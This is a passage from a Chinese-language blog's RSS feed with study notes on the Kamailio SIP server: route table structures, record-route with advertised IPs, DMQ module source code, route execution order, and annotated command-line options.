&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; idx;					 &lt;span style=&#34;color:#75715e&#34;&gt;/* first empty entry */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; entries;				 &lt;span style=&#34;color:#75715e&#34;&gt;/* total number of entries */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; str_hash_table names; &lt;span style=&#34;color:#75715e&#34;&gt;/* name to route index mappings */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;str_hash_table的结构如下：&lt;/p&gt;</description>
    </item>
    <item>
      <title>对外地址和record-route的问题</title>
      <link>https://wdd.js.org/kamailio/adv-ip-record-route/</link>
      <pubDate>Mon, 23 Dec 2024 19:23:43 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/adv-ip-record-route/</guid>
      <description>&lt;p&gt;网络结构图如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;client就是客户端&lt;/li&gt;
&lt;li&gt;PUBLIC_IP就是VPC1的公网IP&lt;/li&gt;
&lt;li&gt;VPC1和VPC2使用内网IP交互&lt;/li&gt;
&lt;li&gt;VPC2没有公网IP&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1.2.3.4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;udp &lt;span style=&#34;color:#f92672&#34;&gt;---&amp;gt;&lt;/span&gt; VPC1 &lt;span style=&#34;color:#f92672&#34;&gt;---&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168.0.10&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;udp &lt;span style=&#34;color:#f92672&#34;&gt;---&amp;gt;&lt;/span&gt; VPC2
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;节点&lt;/th&gt;
          &lt;th&gt;内网IP&lt;/th&gt;
          &lt;th&gt;公网IP&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;VPC1&lt;/td&gt;
          &lt;td&gt;192.168.0.10&lt;/td&gt;
          &lt;td&gt;1.2.3.4&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;VPC2&lt;/td&gt;
          &lt;td&gt;192.168.0.11&lt;/td&gt;
          &lt;td&gt;无&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;ol&gt;
&lt;li&gt;client通过1.2.3.4访问VPC1&lt;/li&gt;
&lt;li&gt;VPC1因为要在后续请求中也保持在路径中，所以要做record-route&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;</description>
    </item>
    <item>
      <title>DMQ模块源码学习笔记</title>
      <link>https://wdd.js.org/kamailio/dmq-note/</link>
      <pubDate>Sun, 22 Dec 2024 18:07:08 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/dmq-note/</guid>
      <description>&lt;h1 id=&#34;背景&#34;&gt;背景&lt;/h1&gt;
&lt;p&gt;多个SIP注册服务器之间，如何同步分机的注册信息呢？&lt;/p&gt;
&lt;p&gt;简单的方案就是使用共享数据库的方式同步注册信息，这个方案实现起来简单，但是分机的注册信息本身就是个需要频繁增删改查的，数据库很可能在大量注册分机的压力下，成为性能的瓶颈。&lt;/p&gt;
&lt;p&gt;除了数据库之外，OpenSIPS和kamailio分别提供了不同的方案。&lt;/p&gt;
&lt;p&gt;OpenSIPS提供的方案是使用cluster模块，cluster模块在多个实例之间同步分机的注册信息，注册信息的格式是OpenSIPS自定义的格式。
Kamailio的方案是DMQ模块， DMQ听起来高大上，放佛是依赖外部的一个服务。 但它其实就是扩展SIP消息，通过SIP消息来广播分机的注册信息。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-log&#34; data-lang=&#34;log&#34;&gt;KDMQ sip:notification_peer@192.168.40.15:5090 SIP/2.0
Via: SIP/2.0/UDP 192.168.40.15;branch=z9hG4bK55e5.423d95110000
To: &amp;lt;sip:notification_peer@192.168.40.15:5090&amp;gt;
From: &amp;lt;sip:notification_peer@192.168.40.15:5060&amp;gt;;tag=2cdb7a33a7f21abb98fd3a44968e3ffd-5b01
CSeq: 10 KDMQ
Call-ID: 1fe138e07b5d0a7a-50419@192.168.40.15
Content-Length: 116
User-Agent: kamailio (4.3.0 (x86_64/linneaus))
Max-Forwards: 1
Content-Type: text/plain

sip:192.168.40.16:5060;status=active
sip:192.168.40.15:5060;status=disabled
sip:192.168.40.17:5060;status=active
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;源码分析&#34;&gt;源码分析&lt;/h1&gt;
&lt;p&gt;该模块一共暴露了8个参数，其中7个参数都是简单类型，INT和STR，就直接取对应变量的地址就可以了。&lt;/p&gt;
&lt;p&gt;其中notification_address参数是用来配置集群中其他节点的通信地址的，因为要配置多次，所以需要用一个函数来解析。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// dmq.c
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;param_export_t&lt;/span&gt; params[] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;num_workers&amp;#34;&lt;/span&gt;, PARAM_INT, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dmq_num_workers},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ping_interval&amp;#34;&lt;/span&gt;, PARAM_INT, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dmq_ping_interval},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;server_address&amp;#34;&lt;/span&gt;, PARAM_STR, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dmq_server_address},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;server_socket&amp;#34;&lt;/span&gt;, PARAM_STR, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dmq_server_socket},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;notification_address&amp;#34;&lt;/span&gt;, PARAM_STR&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;PARAM_USE_FUNC, dmq_add_notification_address},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;notification_channel&amp;#34;&lt;/span&gt;, PARAM_STR, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dmq_notification_channel},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;multi_notify&amp;#34;&lt;/span&gt;, PARAM_INT, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dmq_multi_notify},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;worker_usleep&amp;#34;&lt;/span&gt;, PARAM_INT, &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt;dmq_worker_usleep},
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	{&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;};
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这些参数都没有加上static关键词，主要目的为了在dmq模块的其他c文件能使用。&lt;/p&gt;</description>
    </item>
    <item>
      <title>路由执行的顺序</title>
      <link>https://wdd.js.org/kamailio/msg-flow/</link>
      <pubDate>Sun, 22 Dec 2024 16:20:42 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/msg-flow/</guid>
      <description>&lt;h1 id=&#34;1-请求消息处理过程&#34;&gt;1. 请求消息处理过程&lt;/h1&gt;
&lt;p&gt;请求可以&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;直接丢弃，不返回任何响应。对于恶意请求，SIP Flood攻击，最好不要返回任何响应。&lt;/li&gt;
&lt;li&gt;直接返回状态码，不做转发，例如直接返回301重定向&lt;/li&gt;
&lt;li&gt;无状态转发&lt;/li&gt;
&lt;li&gt;有状态转发
&lt;ul&gt;
&lt;li&gt;执行分支路由，分支路由也可以将消息丢弃&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;无论有无状态，请求发出去前都会执行onsend_route路由，在onsend_route内部，已经不能对SIP消息再做拦截&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/msg-flow/atta/2024-12-22-17-46-29.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;2-响应消息处理过程&#34;&gt;2. 响应消息处理过程&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;首先执行reply_route{}, 在这个路由里可以将消息丢弃&lt;/li&gt;
&lt;li&gt;然后判断消息是否有状态的
&lt;ul&gt;
&lt;li&gt;有状态，这执行onreply_route[ID]路由
&lt;ul&gt;
&lt;li&gt;如果响应是失败的，还可以执行failure_route[ID], 当前前提是在请求路由里是否设置了钩子&lt;/li&gt;
&lt;li&gt;在失败路由可以，可以再次设置新的目标地址，进行转发； 设置了新的目标地址后，还可以设置分支路由&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;notice tip&#34;&gt;
  &lt;div class=&#34;notice-title&#34;&gt;
    &lt;i class=&#34;fa fa-lightbulb-o&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Tip
  &lt;/div&gt;
  &lt;div class=&#34;notice-content&#34;&gt;这里要注意的是，响应路由在失败路由之前执行。&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/msg-flow/atta/2024-12-22-17-47-27.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;3-重传处理&#34;&gt;3. 重传处理&lt;/h1&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/kamailio/msg-flow/atta/2024-12-22-17-49-19.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>kamailio 启动参数控制</title>
      <link>https://wdd.js.org/kamailio/kamailio-cli-params/</link>
      <pubDate>Sun, 22 Dec 2024 15:46:13 +0800</pubDate>
      <guid>https://wdd.js.org/kamailio/kamailio-cli-params/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -a mode      Auto aliases mode: enable with yes or on,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  disable with no or off
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  一般都是关闭
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --alias&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;val  Add an alias, the value has to be &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;[proto:]hostname[:port]&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;like &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;alias&amp;#39;&lt;/span&gt; global parameter&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  设置对外别名, 在多个对外别名时，相比于在脚本中写死, 更好的方式
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  是在启动时传入, alias一般都是服务的对外域名或者IP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  如果km有多个对外域名，并且不同的环境都不同，这块配置就合适在脚本里写死
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --atexit&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;val Control atexit callbacks execution from external libraries
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  which may access destroyed shm memory causing crash on shutdown.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  Can be y&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;es&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; or &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; to enable atexit callbacks, n&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;o&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; or &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; to disable,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  default is no.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  没用过
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -A define    Add config pre-processor define &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;e.g., -A WITH_AUTH,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;FLT_ACC=1&amp;#39;&lt;/span&gt;, -A &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DEFVAL=&amp;#34;str-val&amp;#34;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  预处理的变量定义
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -b nr        Maximum OS UDP receive buffer size which will not be exceeded by
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  auto-probing-and-increase procedure even &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; OS allows
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -B nr        Maximum OS UDP send buffer size which will not be exceeded by
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  auto-probing-and-increase procedure even &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; OS allows
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  这和上面的有啥区别呢？
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -c           Check configuration file &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; syntax errors
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                可以检查配置文件的语法错误。如果这个选项开启，就只能做检查语法，而不能启动kama
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --cfg-print  Print configuration file evaluating includes and ifdefs
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                 在脚本里有很多预处理指令时，可以用这个参数打印出预处理之后的脚本 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -d           Debugging level control &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multiple -d to increase the level from 0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                调试界别
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --debug&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;val  Debugging level value
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -D           Control how daemonize is &lt;span style=&#34;color:#66d9ef&#34;&gt;done&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  -D..do not fork &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;almost&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; anyway;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  -DD..do not daemonize creator;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  -DDD..daemonize &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                控制是否开启守护进程
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -e           Log messages printed in terminal colors &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;requires -E&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -E           Log to stderr
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -f file      Configuration file &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default: /usr/local/etc/kamailio/kamailio.cfg&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                设置配置文件的位置, 可以覆盖默认的位置
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -g gid       Change gid &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;group id&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -G file      Create a pgid file
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -h           This help message
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --help       Long option &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-h&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -I           Print more internal compile flags and options
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -K           Turn on &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;via:&amp;#34;&lt;/span&gt; host checking when forwarding replies
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -l address   Listen on the specified address/interface &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;multiple -l
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  mean listening on more addresses&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;. The address format is
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;proto:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;addr_lst&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:port&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;/advaddr&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;/socket_name&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  where proto&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;udp|tcp|tls|sctp, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  addr_lst&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; addr|&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;addr, addr_lst&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  addr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;host|ip_address|interface_name, 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  advaddr&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;addr&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:port&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;advertised address&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; and 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  socket_name&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;identifying name.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  E.g: -l localhost, -l udp:127.0.0.1:5080, -l eth0:5062,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  -l udp:127.0.0.1:5080/1.2.3.4:5060,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  -l udp:127.0.0.1:5080//local,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  -l udp:127.0.0.1:5080/1.2.3.4:5060/local,
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  -l &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;sctp:(eth0)&amp;#34;&lt;/span&gt;, -l &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;(eth0, eth1, 127.0.0.1):5065&amp;#34;&lt;/span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                  The default behaviour is to listen on all the interfaces.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                控制listen的地址
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --loadmodule&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;name load the module specified by name
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    --log-engine&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;log engine name and data
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    -L path      Modules search path &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;default: /usr/local/lib64/kamailio/modules&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
